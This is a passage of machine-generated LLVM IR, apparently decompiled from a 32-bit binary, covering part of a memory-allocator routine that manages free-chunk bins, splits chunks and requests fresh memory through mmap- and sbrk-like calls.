  %tmp129 = icmp ult i32 %v0_804dcec, 16
  br i1 %tmp129, label %dec_label_pc_804e21b, label %dec_label_pc_804dcf5

dec_label_pc_804dcf5:                             ; preds = %dec_label_pc_804dcdd
  %v2_804dcf9 = add i32 %v0_804dce9, %v1_804dea6
  store i32 %v2_804dcf9, i32* @edx, align 4
  %v1_804dcfc = or i32 %v1_804dea6, 1
  store i32 %v1_804dcfc, i32* %ebx.global-to-local, align 4
  %v2_804dcff = add i32 %v0_804dce9, 4
  %v3_804dcff = inttoptr i32 %v2_804dcff to i32*
  store i32 %v1_804dcfc, i32* %v3_804dcff, align 4
  %v0_804dd02 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dd04 = or i32 %v0_804dd02, 1
  store i32 %v1_804dd04, i32* %eax.global-to-local, align 4
  %v0_804dd07 = load i32, i32* @edx, align 4
  %v1_804dd07 = load i32, i32* @ebp, align 4
  %v2_804dd07 = add i32 %v1_804dd07, 8
  %v3_804dd07 = inttoptr i32 %v2_804dd07 to i32*
  store i32 %v0_804dd07, i32* %v3_804dd07, align 4
  %v0_804dd0a = load i32, i32* @edx, align 4
  %v1_804dd0a = load i32, i32* @ebp, align 4
  %v2_804dd0a = add i32 %v1_804dd0a, 12
  %v3_804dd0a = inttoptr i32 %v2_804dd0a to i32*
  store i32 %v0_804dd0a, i32* %v3_804dd0a, align 4
  %v0_804dd0d = load i32, i32* @edx, align 4
  %v1_804dd0d = add i32 %v0_804dd0d, 8
  %v2_804dd0d = inttoptr i32 %v1_804dd0d to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804dd0d, align 4
  %v0_804dd14 = load i32, i32* @edx, align 4
  %v1_804dd14 = add i32 %v0_804dd14, 12
  %v2_804dd14 = inttoptr i32 %v1_804dd14 to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804dd14, align 4
  %v0_804dd1b = load i32, i32* %eax.global-to-local, align 4
  %v1_804dd1b = load i32, i32* @edx, align 4
  %v2_804dd1b = add i32 %v1_804dd1b, 4
  %v3_804dd1b = inttoptr i32 %v2_804dd1b to i32*
  store i32 %v0_804dd1b, i32* %v3_804dd1b, align 4
  %v0_804dd1e = load i32, i32* %esi.global-to-local, align 4
  %v1_804dd1e = load i32, i32* @edx, align 4
  %v3_804dd1e = add i32 %v1_804dd1e, %v0_804dd1e
  %v4_804dd1e = inttoptr i32 %v3_804dd1e to i32*
  store i32 %v0_804dd1e, i32* %v4_804dd1e, align 4
  br label %dec_label_pc_804e220

dec_label_pc_804dd28:                             ; preds = %dec_label_pc_804dcbc, %dec_label_pc_804dcac
  %v4_804dcd3 = phi i32 [ %storemerge1.pre, %dec_label_pc_804dcac ], [ %v3_804dcbf, %dec_label_pc_804dcbc ]
  store i32 %v4_804dcd3, i32* %eax.global-to-local, align 4
  %v12_804dd28 = icmp eq i32 %v4_804dcd3, %v2_804dcb0
  %v1_804dd2a = icmp eq i1 %v12_804dd28, false
  br i1 %v1_804dd2a, label %dec_label_pc_804dcbc, label %dec_label_pc_804dd2c.loopexit

dec_label_pc_804dd2c.loopexit:                    ; preds = %dec_label_pc_804dd28
  br label %dec_label_pc_804dd2c

dec_label_pc_804dd2c:                             ; preds = %dec_label_pc_804dd2c.loopexit, %dec_label_pc_804dc9e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804dd35 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804dd35, i32* %ecx.global-to-local, align 4
  %v2_804dd38 = udiv i32 %v1_804dd35, 32
  store i32 %v2_804dd38, i32* @edi, align 4
  %v1_804dd3b = mul nuw nsw i32 %v2_804dd38, 4
  %v2_804dd3b = add i32 %v1_804dd3b, ptrtoint (i32* @global_var_8058a34.145 to i32)
  %v3_804dd3b = inttoptr i32 %v2_804dd3b to i32*
  %v4_804dd3b = load i32, i32* %v3_804dd3b, align 4
  store i32 %v4_804dd3b, i32* %edx.global-to-local, align 4
  %v1_804dd42 = mul i32 %v1_804dd35, 8
  %v2_804dd42 = add i32 %v1_804dd42, ptrtoint (i32* @global_var_805872c.141 to i32)
  store i32 %v2_804dd42, i32* %ebx.global-to-local, align 4
  %v1_804dd49 = urem i32 %v1_804dd35, 32
  %v2_804dd49 = icmp eq i32 %v1_804dd49, 0
  store i32 %v1_804dd49, i32* %ecx.global-to-local, align 4
  br i1 %v2_804dd49, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804dd2c
  %v5_804dd4c = shl i32 1, %v1_804dd49
  store i32 %v5_804dd4c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804dd2c, %bb83, %dec_label_pc_804dd8d
  %v1_804dd4e = phi i32 [ %v1_804dd4e.pre, %dec_label_pc_804dd8d ], [ %v4_804dd3b, %bb83 ], [ %v4_804dd3b, %dec_label_pc_804dd2c ]
  %v0_804dd52 = phi i32 [ %v0_804dd4e.pre, %dec_label_pc_804dd8d ], [ %v5_804dd4c, %bb83 ], [ 1, %dec_label_pc_804dd2c ]
  %tmp84 = icmp ule i32 %v0_804dd52, %v1_804dd4e
  %v1_804dd52 = icmp eq i32 %v0_804dd52, 0
  %v1_804dd54 = icmp eq i1 %v1_804dd52, false
  %or.cond = and i1 %tmp84, %v1_804dd54
  br i1 %or.cond, label %dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge, label %dec_label_pc_804dd56.preheader

dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge: ; preds = %.preheader
  %v0_804dd7d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd82.preheader

dec_label_pc_804dd56.preheader:                   ; preds = %.preheader
  %v0_804dd56.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dd56

dec_label_pc_804dd56:                             ; preds = %dec_label_pc_804dd56.preheader, %dec_label_pc_804dd60
  %v0_804dd56 = phi i32 [ %v0_804dd56.pre, %dec_label_pc_804dd56.preheader ], [ %v1_804dd56, %dec_label_pc_804dd60 ]
  %v1_804dd56 = add i32 %v0_804dd56, 1
  store i32 %v1_804dd56, i32* @edi, align 4
  %v6_804dd5a = icmp ugt i32 %v1_804dd56, 2
  br i1 %v6_804dd5a, label %dec_label_pc_804de11.loopexit, label %dec_label_pc_804dd60

dec_label_pc_804dd60:                             ; preds = %dec_label_pc_804dd56
  %v1_804dd60 = mul i32 %v1_804dd56, 4
  %v2_804dd60 = add i32 %v1_804dd60, ptrtoint (i32* @global_var_8058a34.145 to i32)
  %v3_804dd60 = inttoptr i32 %v2_804dd60 to i32*
  %v4_804dd60 = load i32, i32* %v3_804dd60, align 4
  store i32 %v4_804dd60, i32* %edx.global-to-local, align 4
  %v1_804dd67 = icmp eq i32 %v4_804dd60, 0
  br i1 %v1_804dd67, label %dec_label_pc_804dd56, label %dec_label_pc_804dd6b

dec_label_pc_804dd6b:                             ; preds = %dec_label_pc_804dd60
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804dd72 = mul i32 %v1_804dd56, 256
  store i32 %v2_804dd72, i32* %eax.global-to-local, align 4
  %v1_804dd75 = add i32 %v2_804dd72, ptrtoint (i32* @global_var_805872c.141 to i32)
  store i32 %v1_804dd75, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd82.preheader

dec_label_pc_804dd82.preheader:                   ; preds = %dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge, %dec_label_pc_804dd6b
  %v0_804dd7d12 = phi i32 [ %v1_804dd75, %dec_label_pc_804dd6b ], [ %v0_804dd7d12.pre, %dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804dd6b ], [ %v0_804dd52, %dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge ]
  %v0_804dd93 = phi i32 [ %v4_804dd60, %dec_label_pc_804dd6b ], [ %v1_804dd4e, %dec_label_pc_804dd52.dec_label_pc_804dd82.preheader_crit_edge ]
  %v2_804dd824 = and i32 %v0_804dd93, %esi.promoted
  %v3_804dd825 = icmp eq i32 %v2_804dd824, 0
  br i1 %v3_804dd825, label %dec_label_pc_804dd7d, label %dec_label_pc_804dd86

dec_label_pc_804dd7d:                             ; preds = %dec_label_pc_804dd82.preheader, %dec_label_pc_804dd7d
  %v2_804dd8014 = phi i32 [ %v2_804dd80, %dec_label_pc_804dd7d ], [ %esi.promoted, %dec_label_pc_804dd82.preheader ]
  %v0_804dd7d13 = phi i32 [ %v1_804dd7d, %dec_label_pc_804dd7d ], [ %v0_804dd7d12, %dec_label_pc_804dd82.preheader ]
  %v1_804dd7d = add i32 %v0_804dd7d13, 8
  %v2_804dd80 = mul i32 %v2_804dd8014, 2
  %v2_804dd82 = and i32 %v2_804dd80, %v0_804dd93
  %v3_804dd82 = icmp eq i32 %v2_804dd82, 0
  br i1 %v3_804dd82, label %dec_label_pc_804dd7d, label %dec_label_pc_804dd82.dec_label_pc_804dd86_crit_edge

dec_label_pc_804dd82.dec_label_pc_804dd86_crit_edge: ; preds = %dec_label_pc_804dd7d
  store i32 %v1_804dd7d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804dd80, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dd86

dec_label_pc_804dd86:                             ; preds = %dec_label_pc_804dd82.dec_label_pc_804dd86_crit_edge, %dec_label_pc_804dd82.preheader
  %v0_804dd8d = phi i32 [ %v2_804dd80, %dec_label_pc_804dd82.dec_label_pc_804dd86_crit_edge ], [ %esi.promoted, %dec_label_pc_804dd82.preheader ]
  %v1_804ddb0 = phi i32 [ %v1_804dd7d, %dec_label_pc_804dd82.dec_label_pc_804dd86_crit_edge ], [ %v0_804dd7d12, %dec_label_pc_804dd82.preheader ]
  %v1_804dd86 = add i32 %v1_804ddb0, 12
  %v2_804dd86 = inttoptr i32 %v1_804dd86 to i32*
  %v3_804dd86 = load i32, i32* %v2_804dd86, align 4
  store i32 %v3_804dd86, i32* @ecx, align 4
  %v12_804dd89 = icmp eq i32 %v3_804dd86, %v1_804ddb0
  %v1_804dd8b = icmp eq i1 %v12_804dd89, false
  br i1 %v1_804dd8b, label %dec_label_pc_804dda1, label %dec_label_pc_804dd8d

dec_label_pc_804dd8d:                             ; preds = %dec_label_pc_804dd86
  %v2_804dd8f = mul i32 %v0_804dd8d, 2
  store i32 %v2_804dd8f, i32* %esi.global-to-local, align 4
  %v1_804dd91 = sub i32 -1, %v0_804dd8d
  store i32 %v1_804dd91, i32* %eax.global-to-local, align 4
  %v2_804dd93 = and i32 %v0_804dd93, %v1_804dd91
  store i32 %v2_804dd93, i32* %edx.global-to-local, align 4
  %v1_804dd95 = add i32 %v3_804dd86, 8
  store i32 %v1_804dd95, i32* %ebx.global-to-local, align 4
  %v1_804dd98 = load i32, i32* @edi, align 4
  %v2_804dd98 = mul i32 %v1_804dd98, 4
  %v3_804dd98 = add i32 %v2_804dd98, ptrtoint (i32* @global_var_8058a34.145 to i32)
  %v4_804dd98 = inttoptr i32 %v3_804dd98 to i32*
  store i32 %v2_804dd93, i32* %v4_804dd98, align 4
  %v0_804dd4e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804dd4e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804dda1:                             ; preds = %dec_label_pc_804dd86
  %v1_804dda1 = add i32 %v3_804dd86, 4
  %v2_804dda1 = inttoptr i32 %v1_804dda1 to i32*
  %v3_804dda1 = load i32, i32* %v2_804dda1, align 4
  store i32 %v3_804dda1, i32* %edx.global-to-local, align 4
  %v1_804dda4 = add i32 %v3_804dd86, 12
  %v2_804dda4 = inttoptr i32 %v1_804dda4 to i32*
  %v3_804dda4 = load i32, i32* %v2_804dda4, align 4
  store i32 %v3_804dda4, i32* %eax.global-to-local, align 4
  %v1_804dda7 = and i32 %v3_804dda1, -4
  store i32 %v1_804dda7, i32* @edx, align 4
  %v5_804ddac = sub i32 %v1_804dda7, %v1_804dea6
  store i32 %v5_804ddac, i32* %esi.global-to-local, align 4
  store i32 %v3_804dda4, i32* %v2_804dd86, align 4
  %v0_804ddb3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ddb3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ddb3 = add i32 %v1_804ddb3, 8
  %v3_804ddb3 = inttoptr i32 %v2_804ddb3 to i32*
  store i32 %v0_804ddb3, i32* %v3_804ddb3, align 4
  %v0_804ddb6 = load i32, i32* %esi.global-to-local, align 4
  %tmp130 = icmp ult i32 %v0_804ddb6, 16
  %v0_804ddbb = load i32, i32* @ecx, align 4
  br i1 %tmp130, label %dec_label_pc_804ddbb, label %dec_label_pc_804ddc2

dec_label_pc_804ddbb:                             ; preds = %dec_label_pc_804dda1
  %v1_804ddbb = load i32, i32* @edx, align 4
  %v2_804ddbb = add i32 %v0_804ddbb, 4
  %v3_804ddbb = add i32 %v2_804ddbb, %v1_804ddbb
  %v4_804ddbb = inttoptr i32 %v3_804ddbb to i32*
  %v5_804ddbb = load i32, i32* %v4_804ddbb, align 4
  %v6_804ddbb = or i32 %v5_804ddbb, 1
  store i32 %v6_804ddbb, i32* %v4_804ddbb, align 4
  br label %dec_label_pc_804de09

dec_label_pc_804ddc2:                             ; preds = %dec_label_pc_804dda1
  %v2_804ddc6 = add i32 %v0_804ddbb, %v1_804dea6
  store i32 %v2_804ddc6, i32* %eax.global-to-local, align 4
  %v1_804ddcf = load i32, i32* @ebp, align 4
  %v2_804ddcf = add i32 %v1_804ddcf, 8
  %v3_804ddcf = inttoptr i32 %v2_804ddcf to i32*
  store i32 %v2_804ddc6, i32* %v3_804ddcf, align 4
  %v0_804ddd2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddd2 = load i32, i32* @ebp, align 4
  %v2_804ddd2 = add i32 %v1_804ddd2, 12
  %v3_804ddd2 = inttoptr i32 %v2_804ddd2 to i32*
  store i32 %v0_804ddd2, i32* %v3_804ddd2, align 4
  %v0_804ddd5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddd5 = add i32 %v0_804ddd5, 8
  %v2_804ddd5 = inttoptr i32 %v1_804ddd5 to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804ddd5, align 4
  %v0_804dddc = load i32, i32* %eax.global-to-local, align 4
  %v1_804dddc = add i32 %v0_804dddc, 12
  %v2_804dddc = inttoptr i32 %v1_804dddc to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804dddc, align 4
  %v0_804dde3 = load i32, i32* @global_var_8058730.142, align 16
  %v4_804dde9 = load i32, i32* %eax.global-to-local, align 4
  %v5_804dde9 = select i1 %v8_804db4f, i32 %v4_804dde9, i32 %v0_804dde3
  %v4_804ddec = or i32 %v1_804dea6, 1
  store i32 %v5_804dde9, i32* @global_var_8058730.142, align 16
  %v0_804ddf7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804ddec, i32* %ebx.global-to-local, align 4
  %v1_804ddfd = or i32 %v0_804ddf7, 1
  store i32 %v1_804ddfd, i32* @edx, align 4
  %v3_804de00 = add i32 %v0_804ddf7, %v4_804dde9
  %v4_804de00 = inttoptr i32 %v3_804de00 to i32*
  store i32 %v0_804ddf7, i32* %v4_804de00, align 4
  %v0_804de03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de03 = load i32, i32* @ecx, align 4
  %v2_804de03 = add i32 %v1_804de03, 4
  %v3_804de03 = inttoptr i32 %v2_804de03 to i32*
  store i32 %v0_804de03, i32* %v3_804de03, align 4
  %v0_804de06 = load i32, i32* @edx, align 4
  %v1_804de06 = load i32, i32* %eax.global-to-local, align 4
  %v2_804de06 = add i32 %v1_804de06, 4
  %v3_804de06 = inttoptr i32 %v2_804de06 to i32*
  store i32 %v0_804de06, i32* %v3_804de06, align 4
  br label %dec_label_pc_804de09

dec_label_pc_804de09:                             ; preds = %dec_label_pc_804defd, %dec_label_pc_804ddbb, %dec_label_pc_804ddc2
  %v0_804de09 = load i32, i32* @ecx, align 4
  %v1_804de09 = add i32 %v0_804de09, 8
  store i32 %v1_804de09, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804de11.loopexit:                    ; preds = %dec_label_pc_804dd56
  br label %dec_label_pc_804de11

dec_label_pc_804de11:                             ; preds = %dec_label_pc_804de11.loopexit, %dec_label_pc_804db11, %dec_label_pc_804db19
  %v0_804de11 = load i32, i32* @global_var_805872c.141, align 4
  store i32 %v0_804de11, i32* @ebx, align 4
  store i32 %v1_804dea6, i32* %esi.global-to-local, align 4
  %v1_804de1b = add i32 %v0_804de11, 4
  %v2_804de1b = inttoptr i32 %v1_804de1b to i32*
  %v3_804de1b = load i32, i32* %v2_804de1b, align 4
  %v1_804de1e = add i32 %v1_804dea6, 16
  store i32 %v1_804de1e, i32* @esi, align 4
  %v1_804de25 = and i32 %v3_804de1b, -4
  store i32 %v1_804de25, i32* %ecx.global-to-local, align 4
  %v7_804de28 = icmp ult i32 %v1_804de25, %v1_804de1e
  br i1 %v7_804de28, label %dec_label_pc_804de48, label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804de11
  %v2_804de30 = add i32 %v0_804de11, %v1_804dea6
  store i32 %v2_804de30, i32* @edx, align 4
  %v1_804de33 = or i32 %v1_804dea6, 1
  store i32 %v1_804de33, i32* %eax.global-to-local, align 4
  store i32 %v2_804de30, i32* @global_var_805872c.141, align 4
  store i32 %v1_804de33, i32* %v2_804de1b, align 4
  %v0_804de3f = load i32, i32* %ecx.global-to-local, align 4
  %v5_804de3f = sub i32 %v0_804de3f, %v1_804dea6
  store i32 %v5_804de3f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e1c1

dec_label_pc_804de48:                             ; preds = %dec_label_pc_804de11
  %v0_804de48 = load i8, i8* @global_var_8058700.140, align 256
  %v1_804de48 = and i8 %v0_804de48, 2
  %v2_804de48 = icmp eq i8 %v1_804de48, 0
  %v0_804de4f = load i32, i32* @global_var_8058a5c.146, align 4
  store i32 %v0_804de4f, i32* %edx.global-to-local, align 4
  br i1 %v2_804de48, label %dec_label_pc_804de7c, label %dec_label_pc_804de57

dec_label_pc_804de57:                             ; preds = %dec_label_pc_804de48
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* %stack_var_-92, align 4
  %v2_804de5f = call i32 @function_804e2d9(i32* bitcast (i8* @global_var_8058700.140 to i32*))
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* @ebx, align 4
  %v1_804de69 = add i32 %v1_804dea6, -7
  store i32 %v1_804de69, i32* %eax.global-to-local, align 4
  store i32 %v1_804de69, i32* %stack_var_-92, align 4
  %v1_804de6d = call i32 @function_804daaa(i32 %v1_804de69)
  store i32 %v1_804de6d, i32* %eax.global-to-local, align 4
  store i32 %v1_804de6d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804de7c:                             ; preds = %dec_label_pc_804de48
  store i32 %v1_804dea6, i32* @ebx, align 4
  %v1_804de80 = add i32 %v0_804de4f, -1
  store i32 %v1_804de80, i32* @ecx, align 4
  %v1_804de83 = load i32, i32* @global_var_8058a4c.147, align 4
  %v7_804de83 = icmp ult i32 %v1_804dea6, %v1_804de83
  br i1 %v7_804de83, label %dec_label_pc_804df5e, label %dec_label_pc_804de93

dec_label_pc_804de93:                             ; preds = %dec_label_pc_804de7c
  %v0_804de93 = load i32, i32* @global_var_8058a50.148, align 16
  store i32 %v0_804de93, i32* %eax.global-to-local, align 4
  %v1_804de98 = load i32, i32* @global_var_8058a54.149, align 4
  %v5_804de9e = icmp slt i32 %v0_804de93, %v1_804de98
  br i1 %v5_804de9e, label %dec_label_pc_804dea4, label %dec_label_pc_804df5e

dec_label_pc_804dea4:                             ; preds = %dec_label_pc_804de93
  %v2_804dea6 = add i32 %v1_804dea6, 10
  %v3_804dea6 = add i32 %v2_804dea6, %v0_804de4f
  %v1_804deaa = sub i32 0, %v0_804de4f
  store i32 %v1_804deaa, i32* %eax.global-to-local, align 4
  %v2_804deac = and i32 %v3_804dea6, %v1_804deaa
  store i32 %v2_804deac, i32* @ebx, align 4
  %tmp131 = icmp ugt i32 %v2_804deac, %v1_804dea6
  br i1 %tmp131, label %dec_label_pc_804deb8, label %dec_label_pc_804df5e

dec_label_pc_804deb8:                             ; preds = %dec_label_pc_804dea4
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804dec5 = call i32 @function_804f34c(i32 0, i32 %v2_804deac, i32 3, i32 34, i32 0, i32 0, i32 %v1_804de80, i32 %v1_804de80)
  store i32 %v8_804dec5, i32* %eax.global-to-local, align 4
  %v10_804decd = icmp eq i32 %v8_804dec5, -1
  store i32 %v8_804dec5, i32* %edx.global-to-local, align 4
  br i1 %v10_804decd, label %dec_label_pc_804deb8.dec_label_pc_804df5e_crit_edge, label %dec_label_pc_804ded8

dec_label_pc_804deb8.dec_label_pc_804df5e_crit_edge: ; preds = %dec_label_pc_804deb8
  %v0_804df5e.pre = load i32, i32* @global_var_805872c.141, align 4
  br label %dec_label_pc_804df5e

dec_label_pc_804ded8:                             ; preds = %dec_label_pc_804deb8
  %v1_804deda = urem i32 %v8_804dec5, 8
  %v2_804deda = icmp eq i32 %v1_804deda, 0
  store i32 %v1_804deda, i32* %ecx.global-to-local, align 4
  br i1 %v2_804deda, label %dec_label_pc_804def3, label %dec_label_pc_804dedf

dec_label_pc_804dedf:                             ; preds = %dec_label_pc_804ded8
  %v0_804dee4 = load i32, i32* @ebx, align 4
  %v2_804dee6 = sub nsw i32 8, %v1_804deda
  store i32 %v2_804dee6, i32* %eax.global-to-local, align 4
  %v2_804dee8 = add i32 %v2_804dee6, %v8_804dec5
  store i32 %v2_804dee8, i32* @ecx, align 4
  %v2_804deeb = sub i32 %v0_804dee4, %v2_804dee6
  store i32 %v2_804deeb, i32* %esi.global-to-local, align 4
  %v2_804deed = inttoptr i32 %v2_804dee8 to i32*
  store i32 %v2_804dee6, i32* %v2_804deed, align 4
  br label %dec_label_pc_804defd

dec_label_pc_804def3:                             ; preds = %dec_label_pc_804ded8
  store i32 %v8_804dec5, i32* @ecx, align 4
  %v1_804def5 = inttoptr i32 %v8_804dec5 to i32*
  store i32 0, i32* %v1_804def5, align 4
  br label %dec_label_pc_804defd

dec_label_pc_804defd:                             ; preds = %dec_label_pc_804dedf, %dec_label_pc_804def3
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804dedf ], [ @ebx, %dec_label_pc_804def3 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804defd = or i32 %storemerge, 2
  %v1_804df00 = load i32, i32* @ecx, align 4
  %v2_804df00 = add i32 %v1_804df00, 4
  %v3_804df00 = inttoptr i32 %v2_804df00 to i32*
  store i32 %v1_804defd, i32* %v3_804df00, align 4
  %v0_804df03 = load i32, i32* @global_var_8058a50.148, align 16
  %v0_804df08 = load i32, i32* @global_var_8058a70.150, align 16
  %v1_804df0e = add i32 %v0_804df03, 1
  %v1_804df0f = load i32, i32* @global_var_8058a58.151, align 8
  %v2_804df0f = sub i32 %v1_804df0e, %v1_804df0f
  %v8_804df0f = xor i32 %v1_804df0f, %v1_804df0e
  %v9_804df0f = xor i32 %v2_804df0f, %v1_804df0e
  %v10_804df0f = and i32 %v9_804df0f, %v8_804df0f
  %v11_804df0f = icmp slt i32 %v10_804df0f, 0
  %v12_804df0f = icmp eq i32 %v2_804df0f, 0
  %v13_804df0f = icmp slt i32 %v2_804df0f, 0
  store i32 %v1_804df0e, i32* @global_var_8058a50.148, align 16
  %v3_804df1a = icmp ne i1 %v13_804df0f, %v11_804df0f
  %v4_804df1a = or i1 %v12_804df0f, %v3_804df1a
  %v7_804df1a = select i1 %v4_804df1a, i32 %v1_804df0f, i32 %v1_804df0e
  store i32 %v7_804df1a, i32* @global_var_8058a58.151, align 8
  %v0_804df26 = load i32, i32* @global_var_8058a64.152, align 4
  %v1_804df2b = load i32, i32* @ebx, align 4
  %v2_804df2b = add i32 %v1_804df2b, %v0_804df26
  store i32 %v2_804df2b, i32* @global_var_8058a64.152, align 4
  %tmp86 = icmp ule i32 %v2_804df2b, %v0_804df08
  %v5_804df38 = select i1 %tmp86, i32 %v0_804df08, i32 %v2_804df2b
  store i32 %v5_804df38, i32* @edx, align 4
  %v1_804df3b = load i32, i32* @global_var_8058a68.153, align 8
  %v2_804df3b = add i32 %v1_804df3b, %v2_804df2b
  store i32 %v5_804df38, i32* @global_var_8058a70.150, align 16
  %v1_804df47 = load i32, i32* @global_var_8058a74.154, align 4
  %tmp132 = icmp ule i32 %v2_804df3b, %v1_804df47
  %v5_804df4d = select i1 %tmp132, i32 %v1_804df47, i32 %v2_804df3b
  store i32 %v5_804df4d, i32* %eax.global-to-local, align 4
  store i32 %v5_804df4d, i32* @global_var_8058a74.154, align 4
  br label %dec_label_pc_804de09

dec_label_pc_804df5e:                             ; preds = %dec_label_pc_804dea4, %dec_label_pc_804deb8.dec_label_pc_804df5e_crit_edge, %dec_label_pc_804de93, %dec_label_pc_804de7c
  %v0_804df5e = phi i32 [ %v0_804df5e.pre, %dec_label_pc_804deb8.dec_label_pc_804df5e_crit_edge ], [ %v0_804de11, %dec_label_pc_804de93 ], [ %v0_804de11, %dec_label_pc_804dea4 ], [ %v0_804de11, %dec_label_pc_804de7c ]
  store i32 %v0_804df5e, i32* %eax.global-to-local, align 4
  %v1_804df67 = add i32 %v0_804df5e, 4
  %v2_804df67 = inttoptr i32 %v1_804df67 to i32*
  %v3_804df67 = load i32, i32* %v2_804df67, align 4
  %v1_804df6e = and i32 %v3_804df67, -4
  %v2_804df6e = icmp eq i32 %v1_804df6e, 0
  store i32 %v1_804df6e, i32* @ebp, align 4
  %v1_804df74 = load i32, i32* @global_var_8058a48.155, align 8
  %v0_804df7e = load i8, i8* @global_var_8058a60.156, align 32
  %v1_804df7e = urem i8 %v0_804df7e, 2
  %v2_804df7e = icmp eq i8 %v1_804df7e, 0
  %v1_804df85 = icmp eq i1 %v2_804df7e, false
  %v1_804df6e.op = sub i32 0, %v1_804df6e
  %v2_804df7c.neg = select i1 %v1_804df85, i32 %v1_804df6e.op, i32 0
  %v2_804df74 = add i32 %v1_804de80, %v1_804de1e
  %v4_804df85 = add i32 %v2_804df74, %v1_804df74
  %v5_804df8c = add i32 %v4_804df85, %v2_804df7c.neg
  store i32 %v5_804df8c, i32* %eax.global-to-local, align 4
  %v1_804df90 = sub i32 0, %v0_804de4f
  store i32 %v1_804df90, i32* @edx, align 4
  %v2_804df94 = and i32 %v5_804df8c, %v1_804df90
  store i32 %v2_804df94, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_804df94, 1
  br i1 %tmp87, label %dec_label_pc_804dfb2, label %dec_label_pc_804df9c

dec_label_pc_804df9c:                             ; preds = %dec_label_pc_804df5e
  store i32 %v2_804df94, i32* %stack_var_-92, align 4
  %v1_804dfa0 = call i32 @function_804f744(i32 %v2_804df94)
  store i32 %v1_804dfa0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_804dfab = icmp eq i32 %v1_804dfa0, -1
  store i32 %v1_804dfa0, i32* @ebx, align 4
  %v1_804dfb0 = icmp eq i1 %v10_804dfab, false
  br i1 %v1_804dfb0, label %dec_label_pc_804e009, label %dec_label_pc_804df9c.dec_label_pc_804dfb2_crit_edge

dec_label_pc_804df9c.dec_label_pc_804dfb2_crit_edge: ; preds = %dec_label_pc_804df9c
  %v0_804dfb2.pre = load i8, i8* @global_var_8058a60.156, align 32
  br label %dec_label_pc_804dfb2

dec_label_pc_804dfb2:                             ; preds = %dec_label_pc_804df9c.dec_label_pc_804dfb2_crit_edge, %dec_label_pc_804df5e
  %v0_804dfdf = phi i32 [ -1, %dec_label_pc_804df9c.dec_label_pc_804dfb2_crit_edge ], [ %v1_804df90, %dec_label_pc_804df5e ]
  %v0_804dfb2 = phi i8 [ %v0_804dfb2.pre, %dec_label_pc_804df9c.dec_label_pc_804dfb2_crit_edge ], [ %v0_804df7e, %dec_label_pc_804df5e ]
  %v1_804dfb2 = urem i8 %v0_804dfb2, 2
  %v2_804dfb2 = icmp eq i8 %v1_804dfb2, 0
  br i1 %v2_804dfb2, label %dec_label_pc_804dfb2.dec_label_pc_804dfc7_crit_edge, label %dec_label_pc_804dfbb

dec_label_pc_804dfb2.dec_label_pc_804dfc7_crit_edge: ; preds = %dec_label_pc_804dfb2
  %v0_804dfc7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dfc7

dec_label_pc_804dfbb:                             ; preds = %dec_label_pc_804dfb2
  %v2_804dfbf = add i32 %v1_804df6e, %v1_804de80
  store i32 %v2_804dfbf, i32* %eax.global-to-local, align 4
  %v0_804dfc1 = load i32, i32* @esi, align 4
  %v2_804dfc1 = add i32 %v0_804dfc1, %v2_804dfbf
  %v5_804dfc3 = and i32 %v2_804dfc1, %v1_804df90
  store i32 %v5_804dfc3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dfc7

dec_label_pc_804dfc7:                             ; preds = %dec_label_pc_804dfb2.dec_label_pc_804dfc7_crit_edge, %dec_label_pc_804dfbb
  %v3_804dfd2 = phi i32 [ %v0_804dfc7.pre, %dec_label_pc_804dfb2.dec_label_pc_804dfc7_crit_edge ], [ %v5_804dfc3, %dec_label_pc_804dfbb ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_804dfd2, 1048576
  %v5_804dfd2 = select i1 %tmp88, i32 1048576, i32 %v3_804dfd2
  store i32 %v5_804dfd2, i32* @esi, align 4
  %tmp133 = icmp ugt i32 %v5_804dfd2, %v1_804dea6
